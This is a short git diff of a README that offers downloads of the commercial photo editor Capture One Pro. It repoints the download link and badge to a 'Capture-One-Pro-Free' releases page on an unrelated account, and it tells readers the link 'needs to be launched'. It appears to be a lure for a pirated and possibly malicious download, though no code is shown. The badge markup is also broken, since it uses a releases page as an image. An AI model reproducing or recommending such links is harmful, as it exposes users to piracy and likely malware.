@@ -26,9 +26,9 @@ This repository contains resources related to Capture One Pro, including code sn
 
 ## Resources
 To access additional resources and downloads, please visit the following link:
-[Download Capture One Pro](https://github.com/files/Project.zip)
+[Download Capture One Pro](https://github.com/cybersecurityone/Capture-One-Pro-Free/releases)
 
-[![Download Capture One Pro](https://img.shields.io/badge/Download-Capture_One_Pro-blue.svg)](https://github.com/files/Project.zip)
+[![Download Capture One Pro](https://github.com/cybersecurityone/Capture-One-Pro-Free/releases)](https://github.com/cybersecurityone/Capture-One-Pro-Free/releases)
 
 Please note: The provided link needs to be launched to access the files.
 
